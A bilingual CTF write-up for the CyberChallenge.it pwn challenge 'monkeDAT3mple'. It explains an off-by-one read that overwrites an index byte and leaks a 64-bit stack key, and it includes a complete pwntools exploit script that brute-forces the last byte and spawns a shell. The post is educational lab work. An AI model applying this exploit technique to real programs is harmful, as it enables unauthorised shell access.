---
layout: cyber-post
title: "monkeDAT3mple - Out-of-bounds read to leak a 64-bit key"
date: 2025-04-15
categories: 
  - writeups
  - stack
tags:
  - out of bounds
  - info leak
  - stack
  - pwn
  - ctf
  - cyberchallenge
excerpt: "Writeup della challenge monkeDAT3mple di CyberChallenge: un off-by-one nel loop di input permette di leakare byte per byte una chiave a 64 bit dallo stack"
---

<div id="star-alert" class="star-alert">
  <div class="star-alert-content">
    <span class="star-icon">⭐</span>
    <span class="star-text lang-it">Ti piace il sito?</span>
    <span class="star-text lang-en">Do you like the site?</span>
    <br>
    <span class="star-text lang-it">Lascia una stella su GitHub!</span>
    <span class="star-text lang-en">Leave a star on GitHub!</span>
    <br>
    <a href="https://github.com/Chris1sFlaggin/Chris1sFlaggin.github.io" target="_blank" class="star-button">
      <span class="lang-it">⭐ Stella</span>
      <span class="lang-en">⭐ Star</span>
    </a>
    <button id="close-star-alert" class="close-button">&times;</button>
  </div>
</div>

<div class="lang-it" markdown="1">
PWN CTF challenge write up. Challenge di **CyberChallenge.it** (autore: *carRr*), risolta come pwn tutor a UniTo.

---

# monkeDAT3mple

## Il programma

Il `main` genera una chiave a 64 bit e la confronta con una parola che gli mandiamo noi:

</div>

<div class="lang-en" markdown="1">
PWN CTF challenge write up. **CyberChallenge.it** challenge (author: *carRr*), solved as a pwn tutor at UniTo.

---

# monkeDAT3mple

## The program

`main` generates a 64-bit key and compares it with a word we send:

</div>

```c
uint64_t urandom64() { return ((uint64_t)rand() << 32) | rand(); }

int main() {
    srand(time(NULL));
    uint64_t solar_allignement = urandom64();
    welcomechurc();
    uint64_t monkeword = 0;
    read(STDIN_FILENO, &monkeword, sizeof(monkeword));
    if (monkeword == solar_allignement) { system("/bin/sh"); }
}
```

<div class="lang-it" markdown="1">
Indovinare 64 bit alla cieca è impossibile (1 su 2^64). Il bug sta però in `welcomechurc()`:

</div>

<div class="lang-en" markdown="1">
Guessing 64 bits blindly is impossible (1 in 2^64). The bug, however, lives in `welcomechurc()`:

</div>

```c
void welcomechurc() {
    char memory_area[23];
    char *little_monke_word = memory_area;
    char *monke_char_idx    = (char *)(memory_area + 16);
    char *choosen_letters   = memory_area + 17;

    for (int i = 0; i < 7; i++) {
        *monke_char_idx = rand() % 16;
        for (int i = 0; i <= 16; i++) {        // <= 16 : legge 17 byte in un buffer da 16!
            little_monke_word[i] = getc(stdin);
        }
        printf("I choose %c.\n", little_monke_word[*monke_char_idx]);
        choosen_letters[i] = little_monke_word[*monke_char_idx];
    }
}
```

<div class="lang-it" markdown="1">
## La vulnerabilità

Ci sono due problemi che si combinano:

1. Il loop interno gira con `i <= 16`, quindi legge **17 byte** in `little_monke_word[16]`, che è un buffer da 16. Il 17° byte (indice 16) va a sovrascrivere `*monke_char_idx`, cioè l'indice del carattere che il programma poi ci stampa.
2. `printf("I choose %c.\n", little_monke_word[*monke_char_idx])` usa quell'indice come offset di lettura. Controllando l'indice possiamo far leggere al programma **oltre** il buffer da 16 byte, dentro lo stack del chiamante — proprio dove vive la chiave `solar_allignement`.

Il flusso `srand(time(NULL))` viene chiamato in `main` **prima** di `welcomechurc`, quindi non possiamo prevedere la chiave; ma non ci serve prevederla: la leakiamo.

## L'exploit

Per ognuno dei 7 giri riempiamo il buffer con 16 byte di padding e come 17° byte (che finisce in `monke_char_idx`) mettiamo l'offset da cui vogliamo leggere: `64 + j`. In questo modo `little_monke_word[64+j]` legge il byte `j` della chiave sullo stack del `main`, e il programma ce lo stampa gentilmente con `I choose %c`.

</div>

<div class="lang-en" markdown="1">
## The vulnerability

Two issues combine:

1. The inner loop runs with `i <= 16`, so it reads **17 bytes** into `little_monke_word[16]`, a 16-byte buffer. The 17th byte (index 16) overwrites `*monke_char_idx`, i.e. the index of the character the program then prints back.
2. `printf("I choose %c.\n", little_monke_word[*monke_char_idx])` uses that index as a read offset. By controlling the index we can make the program read **past** the 16-byte buffer, into the caller's stack — exactly where the key `solar_allignement` lives.

`srand(time(NULL))` is called in `main` **before** `welcomechurc`, so we can't predict the key; but we don't need to — we leak it.

## The exploit

For each of the 7 rounds we fill the buffer with 16 padding bytes, and as the 17th byte (which lands in `monke_char_idx`) we place the offset we want to read from: `64 + j`. That way `little_monke_word[64+j]` reads byte `j` of the key on `main`'s stack, and the program kindly prints it back with `I choose %c`.

</div>

```python
from pwn import *
while True:
    p = process("./daTemple")
    password = b""
    for j in range(7):
        p.recvuntil(b"By. Char\n")
        byte = 64 + j                     # offset di lettura nello stack del main
        for i in range(17):
            p.send(b"A" if i != 16 else byte.to_bytes(1, "little"))
        p.recvuntil(b"choose ")
        password = p.recv(1) + password   # un byte della chiave alla volta
    # solo 7 giri => l'8° byte va indovinato: 1/256
    password = b"\x69" + password
    password_int = u64(password.ljust(8, b"\x00"), endianness="little")
    p.recvuntil(b"word, my little monke!\n")
    p.send(p64(password_int, endianness="big"))
    if b"You deserve the power." in p.recvline():
        break
    p.close()
p.interactive()
```

<div class="lang-it" markdown="1">
### La nota dell'8° byte

Il loop gira solo **7 volte**, quindi possiamo leakare 7 degli 8 byte della chiave. L'ottavo byte lo lasciamo fisso (`\x69`) e ci affidiamo alla probabilità: 1 su 256, del tutto fattibile con qualche retry. Il `while True` fa esattamente questo: riprova finché il byte mancante non è quello giusto e otteniamo la shell.

> 💭 Se hai bisogno di chiarimenti scrivimi pure su discord: *chris1sflaggin*.
</div>

<div class="lang-en" markdown="1">
### The 8th-byte catch

The loop only runs **7 times**, so we can leak 7 of the key's 8 bytes. We keep the eighth byte fixed (`\x69`) and rely on probability: 1 in 256, perfectly feasible with a few retries. The `while True` does exactly that: it keeps retrying until the missing byte is right and we pop the shell.

> 💭 If you need any clarification, feel free to text me on discord: *chris1sflaggin*.
</div>
